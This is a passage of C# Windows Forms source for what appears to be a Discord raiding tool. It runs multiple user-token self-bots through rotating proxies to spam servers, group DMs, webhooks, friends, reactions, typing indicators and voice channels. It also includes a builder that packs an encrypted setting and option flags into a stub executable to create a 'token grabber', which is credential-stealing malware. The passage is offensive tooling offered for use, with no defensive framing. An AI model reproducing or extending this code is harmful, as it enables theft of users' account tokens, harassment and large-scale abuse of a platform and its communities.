    {
        if (saveFileDialog1.ShowDialog() == DialogResult.OK)
        {
            pictureBox10.BackgroundImage.Save(saveFileDialog1.FileName);
        }
    }
    private void metroButton177_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (DiscordMessage discordMessage in discordClient.GetChannelMessages(ulong.Parse(metroTextBox113.Text)))
            {
                if (discordMessage.Id == ulong.Parse(metroTextBox114.Text))
                {
                    Clipboard.SetText(discordMessage.Content.ToString());
                    return;
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton179_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (DiscordMessage discordMessage in discordClient.GetChannelMessages(ulong.Parse(metroTextBox115.Text)))
            {
                try
                {
                    if (discordMessage.Id == ulong.Parse(metroTextBox116.Text))
                    {
                        discordClient.GetChannel(ulong.Parse(metroTextBox118.Text)).ToTextChannel().SendMessage(discordMessage.Content, discordMessage.Tts, discordMessage.Embed);
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton178_Click_1(object sender, EventArgs e)
    {
        try
        {
            List<DiscordMessage> listona = (List<DiscordMessage>)discordClient.GetChannelMessages(ulong.Parse(metroTextBox115.Text));
            listona.Reverse();
            foreach (DiscordMessage discordMessage in listona)
            {
                try
                {
                    discordClient.GetChannel(ulong.Parse(metroTextBox118.Text)).ToTextChannel().SendMessage(discordMessage.Content, discordMessage.Tts, discordMessage.Embed);
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton181_Click(object sender, EventArgs e)
    {
        try
        {
            Thread thread = new Thread(new ThreadStart(doMessageDeleter));
            thread.Start();
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton184_Click(object sender, EventArgs e)
    {
        try
        {
            try
            {
                int j = 0;
                SocketGuild socketGuild = getIndexedGuild(metroComboBox3.SelectedIndex);
                foreach (SocketRole socketRole in socketGuild.Roles)
                {
                    if (j == listBox5.SelectedIndex)
                    {
                        Clipboard.SetText(socketRole.Name);
                        return;
                    }
                    j++;
                }
            }
            catch (Exception ex)
            {
            }
        }
        catch (Exception ex)
        {
        }
    }
    private async void metroButton185_Click(object sender, EventArgs e)
    {
        foreach (AClient aClient in loadedSelfBots)
        {
            await Task.Delay((int)numericUpDown17.Value);
            Thread thread = new Thread(() => doVocalJoiner(aClient));
            thread.Start();
        }
    }
    public void doVocalJoiner(AClient aClient)
    {
        try
        {
            DiscordSocketClient discordSocketClient = new DiscordSocketClient();
            discordSocketClient.LoginAsync(TokenType.User, aClient.GetClient().Token, false);
            discordSocketClient.StartAsync();
            Thread.Sleep(2000);
            discordSocketClient.CurrentUser.IsVerified.ToString();
            Thread.Sleep(1000);
            try
            {
                try
                {
                    foreach (SocketVoiceChannel voiceChannel in discordSocketClient.GetGuild(ulong.Parse(metroTextBox123.Text)).VoiceChannels)
                    {
                        try
                        {
                            if (voiceChannel.Id == ulong.Parse(metroTextBox124.Text))
                            {
                                try
                                {
                                    voiceChannel.ConnectAsync();
                                }
                                catch (Exception)
                                {
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                }
                catch (Exception ex)
                {
                }
            }
            catch (Exception ex)
            {
            }
            Thread.Sleep((int)numericUpDown17.Value);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton187_Click(object sender, EventArgs e)
    {
        try
        {
            dmToolWorking = true;
            metroButton187.Enabled = false;
            foreach (AClient aClient in loadedSelfBots)
            {
                for (int i = 0; i < 3; i++)
                {
                    Thread thread = new Thread(() => doDMTool(aClient));
                    thread.Start();
                }
            }
            metroButton186.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton186_Click_1(object sender, EventArgs e)
    {
        try
        {
            metroButton186.Enabled = false;
            dmToolWorking = false;
            metroButton187.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    public void doDMTool(AClient aClient)
    {
        try
        {
            while (true)
            {
                if (!dmToolWorking)
                {
                    return;
                }
                Thread.Sleep((int)numericUpDown30.Value);
                try
                {
                    try
                    {
                        setRandomProxy();
                        aClient.GetClient().SendMessage(ulong.Parse(Utils.GetChannelIDByFriendID(aClient.GetClient().Token, metroTextBox125.Text)), metroTextBox126.Text);
                    }
                    catch (Exception ex)
                    {
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    public void doMessageDeleter()
    {
        try
        {
            ulong channelId = ulong.Parse(metroTextBox120.Text);
            if (metroComboBox11.SelectedIndex == 0)
            {
                channelId = ulong.Parse(Utils.GetChannelIDByFriendID(discordClient.Token, metroTextBox120.Text));
            }
            try
            {
                foreach (DiscordMessage discordMessage in discordClient.GetChannelMessages(channelId))
                {
                    try
                    {
                        if (!metroCheckBox120.Checked)
                        {
                            try
                            {
                                discordMessage.Delete();
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else
                        {
                            try
                            {
                                if (discordMessage.Author.User.Id == theSocketClient.CurrentUser.Id)
                                {
                                    try
                                    {
                                        discordMessage.Delete();
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                    }
                }
            }
            catch (Exception ex)
            {
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void MainForm_Load(object sender, EventArgs e)
    {

    }
    private void metroButton182_Click(object sender, EventArgs e)
    {
        try
        {
            Clipboard.SetText(getIndexedGuild(metroComboBox4.SelectedIndex).Id.ToString());
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton183_Click(object sender, EventArgs e)
    {
        SocketGuild socketGuild = theSocketClient.GetGuild(ulong.Parse(metroTextBox121.Text));
        string totalChannels = "Not found.";
        try
        {
            totalChannels = socketGuild.Channels.Count.ToString();
        }
        catch (Exception ex)
        {
        }
        string textChannels = "Not found.";
        try
        {
            textChannels = socketGuild.TextChannels.Count.ToString();
        }
        catch (Exception ex)
        {
        }
        string voiceChannels = "Not found.";
        try
        {
            voiceChannels = socketGuild.VoiceChannels.Count.ToString();
        }
        catch (Exception ex)
        {
        }
        string roles = "Not found.";
        try
        {
            roles = socketGuild.Roles.Count.ToString();
        }
        catch (Exception ex)
        {
        }
        string emotes = "Not found.";
        try
        {
            emotes = socketGuild.Emotes.Count.ToString();
        }
        catch (Exception ex)
        {
        }
        string iconId = "Not found.";
        try
        {
            iconId = socketGuild.IconId.ToString();
        }
        catch (Exception ex)
        {
        }
        string iconUrl = "Not found.";
        try
        {
            iconUrl = socketGuild.IconUrl;
        }
        catch (Exception ex)
        {
        }
        string splashId = "Not found.";
        try
        {
            splashId = socketGuild.SplashId.ToString();
        }
        catch (Exception ex)
        {
        }
        string splashUrl = "Not found.";
        try
        {
            splashUrl = socketGuild.SplashUrl;
        }
        catch (Exception ex)
        {
        }
        string defaultName = "Not found.";
        try
        {
            defaultName = socketGuild.DefaultChannel.Name;
        }
        catch (Exception ex)
        {
        }
        string defaultId = "Not found.";
        try
        {
            defaultId = socketGuild.DefaultChannel.Id.ToString();
        }
        catch (Exception ex)
        {
        }
        string afkName = "Not found.";
        try
        {
            afkName = socketGuild.AFKChannel.Name;
        }
        catch (Exception ex)
        {
        }
        string afkId = "Not found.";
        try
        {
            afkId = socketGuild.AFKChannel.Id.ToString();
        }
        catch (Exception ex)
        {
        }
        string verificationLevel = "Not found.";
        try
        {
            verificationLevel = socketGuild.VerificationLevel.ToString();
        }
        catch (Exception ex)
        {
        }
        string guildName = "Not found.";
        try
        {
            guildName = socketGuild.Name;
        }
        catch (Exception ex)
        {
        }
        string afkTimeout = "Not found.";
        try
        {
            afkTimeout = socketGuild.AFKTimeout.ToString();
        }
        catch (Exception ex)
        {
        }
        string createdAt = "Not found.";
        try
        {
            createdAt = socketGuild.CreatedAt.ToString();
        }
        catch (Exception ex)
        {
        }
        string ownerId = "Not found.";
        try
        {
            ownerId = socketGuild.OwnerId.ToString();
        }
        catch (Exception ex)
        {
        }
        string ownerTag = "Not found.";
        try
        {
            ownerTag = socketGuild.Owner.Username + "#" + socketGuild.Owner.Discriminator;
        }
        catch (Exception ex)
        {
        }
        string usersCount = "Not found.";
        try
        {
            usersCount = socketGuild.Users.Count.ToString();
        }
        catch (Exception ex)
        {
        }
        string mfaLevel = "Not found.";
        try
        {
            mfaLevel = socketGuild.MfaLevel.ToString();
        }
        catch (Exception ex)
        {
        }
        string voiceRegionId = "Not found.";
        try
        {
            voiceRegionId = socketGuild.VoiceRegionId;
        }
        catch (Exception ex)
        {
        }
        string allRoles = "";
        try
        {
            foreach (SocketRole socketRole in socketGuild.Roles)
            {
                try
                {
                    allRoles += socketRole.Name + " (" + socketRole.Id.ToString() + "), ";
                }
                catch (Exception ex)
                {

                }
            }
        }
        catch (Exception ex)
        {
        }
        if (allRoles == "")
        {
            allRoles = "Not found.";
        }
        else if (allRoles.EndsWith(", "))
        {
            allRoles = allRoles.Substring(0, allRoles.Length - 2);
        }
        metroTextBox122.Text = "Server name: " + guildName + Environment.NewLine +
            "Verification level: " + verificationLevel + Environment.NewLine +
            "AFK timeout (in seconds): " + afkTimeout + Environment.NewLine +
            "Total channels: " + totalChannels + Environment.NewLine +
            "Text channels: " + textChannels + Environment.NewLine +
            "Voice channels: " + voiceChannels + Environment.NewLine +
            "Voice region: " + voiceRegionId + Environment.NewLine +
            "Roles number: " + roles + Environment.NewLine +
            "Server created at: " + createdAt + Environment.NewLine +
            "Server Owner ID: " + ownerId + Environment.NewLine +
            "Server Owner Tag: " + ownerTag + Environment.NewLine +
            "Emotes: " + emotes + Environment.NewLine +
            "Users: " + usersCount + Environment.NewLine +
            "Mfa level: " + mfaLevel + Environment.NewLine +
            "Server icon ID: " + iconId + Environment.NewLine +
            "Server icon URL: " + iconUrl + Environment.NewLine +
            "Server splash ID: " + splashId + Environment.NewLine +
            "Server splash URL: " + splashUrl + Environment.NewLine +
            "Default channel name: " + defaultName + Environment.NewLine +
            "Default channel ID: " + defaultId + Environment.NewLine +
            "AFK channel name: " + afkName + Environment.NewLine +
            "AFK channel ID: " + afkId + Environment.NewLine +
            "All server roles: " + allRoles;
    }
    private void metroButton171_Click(object sender, EventArgs e)
    {
        try
        {
            if (System.IO.File.Exists(metroTextBox117.Text))
            {
                try
                {
                    System.IO.File.Delete(metroTextBox117.Text);
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Failed to create your token grabber!", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
            }
            string temp = Application.StartupPath + "\\temp.exe";
            string stub = "";
            string splitter = "|EKJRKJWEKRJLWEKRJLKJEWRLKWJERLKWJERWELRKWEKJRLKRJELJWKLKRJWLJEKRLKJEWLKRJWEJKRLKWJERLKJWERLKJWEJKRJEWKRLKWJERLKJWERLKJWELKRJWELKRWRLKJWERJLK|";
            File.WriteAllBytes(temp, Resources.lol);
            FileSystem.FileOpen(1, temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default);
            stub = Strings.Space((int)FileSystem.LOF(1));
            FileSystem.FileGet(1, ref stub);
            FileSystem.FileClose(1);
            FileSystem.FileOpen(1, metroTextBox117.Text, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default);
            FileSystem.FilePut(1, stub + splitter + Utils.AES_Encrypt(metroTextBox112.Text, "X358791X") + splitter + metroCheckBox102.Checked.ToString() + splitter + metroCheckBox103.Checked.ToString() + splitter + metroCheckBox104.Checked.ToString() + splitter + metroCheckBox105.Checked.ToString() + splitter + metroCheckBox106.Checked.ToString() + splitter);
            FileSystem.FileClose(1);
            if (File.Exists("stub.exe"))
            {
                try
                {
                    File.Delete("stub.exe");
                }
                catch (Exception ex)
                {
                }
            }
            if (File.Exists("temp.exe"))
            {
                try
                {
                    File.Delete("temp.exe");
                }
                catch (Exception ex)
                {
                }
            }
            MessageBox.Show("Succesfully created your token grabber!", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        catch (Exception ex)
        {
            MessageBox.Show("Failed to create your token grabber!", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
    public void doGroupBomber()
    {
        try
        {
            while (true)
            {
                Thread.Sleep((int)numericUpDown29.Value);
                try
                {
                    List<ulong> users = new List<ulong>();
                    foreach (string line in metroTextBox108.Lines)
                    {
                        try
                        {
                            users.Add(ulong.Parse(line));
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                    DiscordGroup discordGroup = discordClient.CreateGroup(users);
                    if (metroCheckBox100.Checked)
                    {
                        try
                        {
                            string theName = metroTextBox111.Text;
                            if (metroRadioButton52.Checked)
                            {
                                theName = Utils.RandomNormalString(99);
                            }
                            else if (metroRadioButton53.Checked)
                            {
                                theName = Utils.RandomChineseString(99);
                            }
                            else if (metroRadioButton55.Checked)
                            {
                                theName = Utils.GetLagString();
                            }
                            Discord.REQ.Group.Rename(discordGroup.Id.ToString(), theName, discordClient.Token);
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                    if (metroCheckBox101.Checked)
                    {
                        try
                        {
                            discordGroup.Leave();
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                }
                catch (Exception ex)
                {

                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton159_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton159.Enabled = false;
            messageScheduler.Abort();
            metroButton160.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroRadioButton17_CheckedChanged(object sender, EventArgs e)
    {
        numericUpDown7.Enabled = metroRadioButton17.Checked;
    }
    public void doServerVocalSpammer()
    {
        try
        {
            while (true)
            {
                try
                {
                    try
                    {
                        foreach (SocketVoiceChannel voiceChannel in theSocketClient.GetGuild(ulong.Parse(metroTextBox91.Text)).VoiceChannels)
                        {
                            try
                            {
                                if (voiceChannel.Id == ulong.Parse(metroTextBox90.Text))
                                {
                                    try
                                    {
                                        voiceChannel.ConnectAsync();
                                    }
                                    catch (Exception)
                                    {
                                    }
                                    Thread.Sleep((int)numericUpDown20.Value);
                                    try
                                    {
                                        voiceChannel.ConnectAsync();
                                    }
                                    catch (Exception)
                                    {
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                    }
                }
                catch (Exception ex)
                {
                }
                Thread.Sleep((int)numericUpDown21.Value);
            }
        }
        catch (Exception ex)
        {
        }
    }
    public void doMassMessage()
    {
        try
        {
            foreach (Relationship relationship in discordClient.GetRelationships())
            {
                try
                {
                    bool canSend = false;
                    if (metroComboBox7.SelectedIndex == 4)
                    {
                        canSend = true;
                    }
                    else if (metroComboBox7.SelectedIndex == 0)
                    {
                        if ((int)theSocketClient.GetUser(relationship.User.Id).Status == 0)
                        {
                            canSend = true;
                        }
                    }
                    else if (metroComboBox7.SelectedIndex == 1)
                    {
                        if ((int)theSocketClient.GetUser(relationship.User.Id).Status == 1)
                        {
                            canSend = true;
                        }
                    }
                    else if (metroComboBox7.SelectedIndex == 2)
                    {
                        if ((int)theSocketClient.GetUser(relationship.User.Id).Status == 2)
                        {
                            canSend = true;
                        }
                    }
                    else
                    {
                        if ((int)theSocketClient.GetUser(relationship.User.Id).Status == 3)
                        {
                            canSend = true;
                        }
                    }
                    int theDelay = (int)numericUpDown19.Value;
                    if (metroCheckBox85.Checked)
                    {
                        theDelay = Utils.GetRandomNumber(750, 1250);
                    }
                    Thread.Sleep(theDelay);
                    if (canSend)
                    {
                        if (metroRadioButton45.Checked)
                        {
                            theSocketClient.GetUser(relationship.User.Id).SendMessageAsync(metroTextBox88.Text);
                        }
                        else if (metroRadioButton43.Checked)
                        {
                            foreach (string line in metroTextBox104.Lines)
                            {
                                if (relationship.User.Id.ToString() == line)
                                {
                                    theSocketClient.GetUser(relationship.User.Id).SendMessageAsync(metroTextBox88.Text);
                                    break;
                                }
                            }
                        }
                        else
                        {
                            bool canSend1 = true;
                            foreach (string line in metroTextBox104.Lines)
                            {
                                if (relationship.User.Id.ToString() == line)
                                {
                                    canSend1 = false;
                                    break;
                                }
                            }
                            if (canSend1)
                            {
                                theSocketClient.GetUser(relationship.User.Id).SendMessageAsync(metroTextBox88.Text);
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton37_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton37.Enabled = false;
            groupSpammer.Abort();
            metroButton38.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    public void doGroupSpammer()
    {
        try
        {
            while (true)
            {
                try
                {
                    SocketGroupChannel socketGroupChannel = getIndexedGroup(listBox1.SelectedIndex);
                    string theMessage = metroTextBox13.Text;
                    int theDelay = (int)numericUpDown4.Value;
                    if (metroCheckBox2.Checked)
                    {
                        theDelay = Utils.GetRandomNumber(750, 1250);
                    }
                    if (metroRadioButton7.Checked)
                    {
                        theMessage = Utils.RandomNormalString(1750);
                    }
                    else if (metroRadioButton8.Checked)
                    {
                        theMessage = Utils.RandomChineseString(1750);
                    }
                    else
                    {
                        theMessage = Utils.GetLagString();
                        theMessage = theMessage.Substring(0, theMessage.Length - 300);
                    }
                    if (metroCheckBox3.Checked)
                    {
                        theMessage = " @everyone " + theMessage;
                    }
                    if (metroCheckBox4.Checked)
                    {
                        theMessage = " @here " + theMessage;
                    }
                    if (metroCheckBox5.Checked)
                    {
                        foreach (SocketUser socketUser in socketGroupChannel.Users)
                        {
                            theMessage = " " + socketUser.Mention + " " + theMessage;
                        }
                    }
                    Thread.Sleep(theDelay);
                    socketGroupChannel.SendMessageAsync(theMessage);
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroRadioButton9_CheckedChanged(object sender, EventArgs e)
    {
        metroTextBox13.Enabled = metroRadioButton9.Checked;
    }
    public void doWebhookSpammer()
    {
        try
        {
            while (true)
            {
                try
                {
                    string theMessage = metroTextBox79.Text;
                    string theName = metroTextBox80.Text;
                    if (metroRadioButton33.Checked)
                    {
                        theMessage = Utils.RandomNormalString(1750);
                    }
                    else if (metroRadioButton34.Checked)
                    {
                        theMessage = Utils.RandomChineseString(1750);
                    }
                    else if (metroRadioButton36.Checked)
                    {
                        theMessage = Utils.GetLagString();
                        theMessage = theMessage.Substring(0, theMessage.Length - 300);
                    }
                    if (metroCheckBox75.Checked)
                    {
                        theName = Utils.RandomNormalString(32);
                    }
                    else if (metroCheckBox76.Checked)
                    {
                        theName = Utils.RandomChineseString(32);
                    }
                    else if (metroCheckBox78.Checked)
                    {
                        theName = "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$";
                    }
                    Discord.REQ.WebHoock.Send(theMessage, metroTextBox78.Text, theName);
                    Thread.Sleep((int)numericUpDown18.Value);
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private async void metroButton78_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (AClient aClient in loadedSelfBots)
            {
                await Task.Delay((int)numericUpDown8.Value);
                Thread thread = new Thread(() => doGuildJoiner(aClient));
                thread.Start();
            }
        }
        catch (Exception ex)
        {
        }
    }
    public void doGuildJoiner(AClient aClient)
    {
        try
        {
            setRandomProxy();
            try
            {
                aClient.GetClient().JoinGuild(Utils.GetInviteCodeByInviteLink(metroTextBox57.Text));
            }
            catch (Exception ex)
            {
            }
        }
        catch (Exception ex)
        {
        }
    }
    private async void metroButton79_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (AClient aClient in loadedSelfBots)
            {
                await Task.Delay((int)numericUpDown9.Value);
                Thread thread = new Thread(() => doGuildLeaver(aClient));
                thread.Start();
            }
        }
        catch (Exception ex)
        {
        }
    }
    public void doGuildLeaver(AClient aClient)
    {
        try
        {
            setRandomProxy();
            try
            {
                aClient.GetClient().GetGuild(ulong.Parse(metroTextBox58.Text)).Leave();
            }
            catch (Exception ex)
            {
            }
        }
        catch (Exception ex)
        {
        }
    }
    private async void metroButton81_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (AClient aClient in loadedSelfBots)
            {
                await Task.Delay((int)numericUpDown10.Value);
                Thread thread = new Thread(() => doAddReactionSpammer(aClient));
                thread.Start();
            }
        }
        catch (Exception ex)
        {
        }
    }
    public void doAddReactionSpammer(AClient aClient)
    {
        try
        {
            setRandomProxy();
            try
            {
                foreach (DiscordMessage message in aClient.GetClient().GetChannel(ulong.Parse(metroTextBox59.Text)).ToTextChannel().GetMessages())
                {
                    if (message.Id == ulong.Parse(metroTextBox60.Text))
                    {
                        try
                        {
                            message.AddReaction(metroTextBox61.Text);
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                }
            }
            catch (Exception ex)
            {
            }
        }
        catch (Exception ex)
        {
        }
    }
    public void doRemoveReactionSpammer(AClient aClient)
    {
        try
        {
            setRandomProxy();
            try
            {
                foreach (DiscordMessage message in aClient.GetClient().GetChannel(ulong.Parse(metroTextBox59.Text)).ToTextChannel().GetMessages())
                {
                    if (message.Id == ulong.Parse(metroTextBox60.Text))
                    {
                        try
                        {
                            message.RemoveReaction(metroTextBox61.Text);
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                }
            }
            catch (Exception ex)
            {
            }
        }
        catch (Exception ex)
        {
        }
    }
    private async void metroButton80_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (AClient aClient in loadedSelfBots)
            {
                await Task.Delay((int)numericUpDown10.Value);
                Thread thread = new Thread(() => doRemoveReactionSpammer(aClient));
                thread.Start();
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton84_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton84.Enabled = false;
            typingSpammerWorking = true;
            foreach (AClient aClient in loadedSelfBots)
            {
                Thread thread = new Thread(() => doTypingSpammer(aClient));
                thread.Start();
            }
            metroButton82.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton82_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton82.Enabled = false;
            typingSpammerWorking = false;
            metroButton84.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    public void doTypingSpammer(AClient aClient)
    {
        try
        {
            while (true)
            {
                if (!typingSpammerWorking)
                {
                    return;
                }
                try
                {
                    setRandomProxy();
                    if (metroCheckBox51.Checked)
                    {
                        foreach (DiscordChannel channel in aClient.GetClient().GetGuild(ulong.Parse(metroTextBox62.Text)).GetChannels())
                        {
                            try
                            {
                                channel.ToTextChannel().TriggerTyping();
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                    }
                    else
                    {
                        foreach (DiscordChannel channel in aClient.GetClient().GetGuild(ulong.Parse(metroTextBox62.Text)).GetChannels())
                        {
                            try
                            {
                                foreach (string line in metroTextBox65.Lines)
                                {
                                    if (!(line.Replace(" ", "").Replace(Constants.vbTab, "") == ""))
                                    {
                                        if (Information.IsNumeric(line))
                                        {
                                            try
                                            {
                                                if (channel.Id.ToString() == line)
                                                {
                                                    try
                                                    {
                                                        channel.ToTextChannel().TriggerTyping();
                                                    }
                                                    catch (Exception ex)
                                                    {
                                                    }
                                                }
                                            }
                                            catch (Exception ex)
                                            {
                                            }
                                        }
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                }
                Thread.Sleep(8000);
            }
        }
        catch (Exception ex)
        {
        }
    }
    private async void metroButton86_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton86.Enabled = false;
            serverSpammerWorking = true;
            foreach (AClient aClient in loadedSelfBots)
            {
                try
                {
                    try
                    {
                        await Task.Delay((int)numericUpDown31.Value);
                        for (int i = 0; i < numericUpDown11.Value; i++)
                        {
                            try
                            {
                                Thread thread = new Thread(() => doServerSpammer(aClient));
                                thread.Start();
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                    }
                }
                catch (Exception ex)
                {
                }
            }
            metroButton85.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton85_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton85.Enabled = false;
            serverSpammerWorking = false;
            metroButton86.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private async void metroButton132_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (AClient aClient in loadedSelfBots)
            {
                await Task.Delay((int)numericUpDown16.Value);
                Thread thread = new Thread(() => doFriendSpammer(aClient));
                thread.Start();
            }
        }
        catch (Exception ex)
        {
        }
    }
    public void doFriendSpammer(AClient aClient)
    {
        try
        {
            setRandomProxy();
            try
            {
                aClient.GetClient().SendFriendRequest(ulong.Parse(metroTextBox72.Text));
            }
            catch (Exception ex)
            {
            }
        }
        catch (Exception ex)
        {
        }
    }
    public void doServerSpammer(AClient aClient)
    {
        try
        {
            while (true)
            {
                try
                {
                    if (!serverSpammerWorking)
                    {
                        return;
                    }
                }
                catch (Exception ex)
                {
                }
                try
                {
                    string theMessage = metroTextBox67.Text;
                    int theDelay = (int)numericUpDown12.Value;
                    if (metroCheckBox53.Checked)
                    {
                        theDelay = Utils.GetRandomNumber(750, 1250);
                    }
                    if (metroRadioButton19.Checked)
                    {
                        theMessage = Utils.RandomNormalString(1750);
                    }
                    else if (metroRadioButton20.Checked)
                    {
                        theMessage = Utils.RandomChineseString(1750);
                    }
                    else if (metroRadioButton22.Checked)
                    {
                        theMessage = Utils.GetLagString();
                    }
                    if (theMessage.Replace(" ", "") == "")
                    {
                        Thread.Sleep(theDelay);
                        continue;
                    }
                    if (metroCheckBox54.Checked)
                    {
                        theMessage = "@everyone " + theMessage;
                    }
                    if (metroCheckBox55.Checked)
                    {
                        theMessage = "@here " + theMessage;
                    }
                    if (metroCheckBox70.Checked)
                    {
                        theMessage += " " + Utils.GetRandomNumber(1000, 9999).ToString();
                    }
                    if (metroCheckBox107.Checked)
                    {
                        theMessage = ">>> " + theMessage;
                    }
                    try
                    {
                        setRandomProxy();
                        if (metroCheckBox58.Checked)
                        {
                            foreach (DiscordChannel channel in aClient.GetClient().GetGuild(ulong.Parse(metroTextBox66.Text)).GetChannels())
                            {
                                try
                                {
                                    channel.ToTextChannel().SendMessage(theMessage, metroCheckBox59.Checked);
                                    Thread.Sleep(theDelay);
                                }
                                catch (Exception ex)
                                {
                                }
                            }
                        }
                        else
                        {
                            foreach (DiscordChannel channel in aClient.GetClient().GetGuild(ulong.Parse(metroTextBox66.Text)).GetChannels())
                            {
                                try
                                {
                                    foreach (string line in metroTextBox68.Lines)
                                    {
                                        if (!(line.Replace(" ", "").Replace(Constants.vbTab, "") == ""))
                                        {
                                            if (Information.IsNumeric(line))
                                            {
                                                try
                                                {
                                                    if (channel.Id.ToString() == line)
                                                    {
                                                        try
                                                        {
                                                            channel.ToTextChannel().SendMessage(theMessage, metroCheckBox59.Checked);
                                                            Thread.Sleep(theDelay);
                                                        }
                                                        catch (Exception ex)
                                                        {
                                                        }
                                                    }
                                                }
                                                catch (Exception ex)
                                                {
                                                }
                                            }
                                        }
                                    }
                                }
                                catch (Exception ex)
                                {
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
}